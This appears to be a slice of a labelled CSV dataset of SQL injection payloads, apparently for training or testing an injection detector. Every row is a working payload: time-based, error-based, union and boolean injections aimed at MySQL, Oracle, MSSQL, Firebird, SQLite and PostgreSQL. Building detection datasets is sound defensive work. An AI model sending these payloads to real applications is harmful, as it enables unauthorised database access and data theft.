row_index,payload_norm,label,sqli_type_hint
8370,"1"" where 4445 = 4445 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1,
8371,"1%"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""%"" = """,1,
8372,"-8894%"" ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""%"" = """,1,
8373,"-3438"" ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""nxiv"" = ""nxiv",1,
8374,-7901 ) order by 1--,1,
8375,1%' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
8376,"1' ) where 6489 = 6489 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1,
8377,"1"" ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
8378,"-3261"" ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""yxms"" = ""yxms",1,
8379,1 where 7464 = 7464 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,1,
8380,"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) # vojr",1,
8381,"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'ckfn' like 'ckfn",1,
8382,1'|| ( select 'uedy' where 8816 = 8816,1,
8383,"1' in boolean mode ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) #",1,
8384,-7951' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'blak' = 'blak,1,
8385,"1' ) ) as ylyq where 2953 = 2953 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
8386,"-4736' ) ) or elt ( 5835 = 5509,5509 ) and ( ( 'iawg' = 'iawg",1,
8387,"-5438"" ) union all select 3170,3170--",1,
8388,"-1368 ) ) union all select 1310,1310,1310,1310,1310#",1,
8389,"-1550' in boolean mode ) union all select 9777,9777,9777--",1,
8390,"1'+ ( select 'mxei' where 7811 = 7811 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
8391,1 where 4372 = 4372,1,
8392,"-8797"" ) ) order by 1#",1,
8393,"-9166"" ) as hlre where 4768 = 4768 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,
8394,1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),1,
8395,"1' where 2964 = 2964 union all select null,null,null#",1,
8396,"1 ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
8397,"1' ) ) and elt ( 4460 = 2665,2665 ) and ( ( 'qmzu' = 'qmzu",1,
8398,"-1256' in boolean mode ) union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",1,
8399,select pg_sleep ( 5 ) and ( ( 'rnzp' = 'rnzp,1,
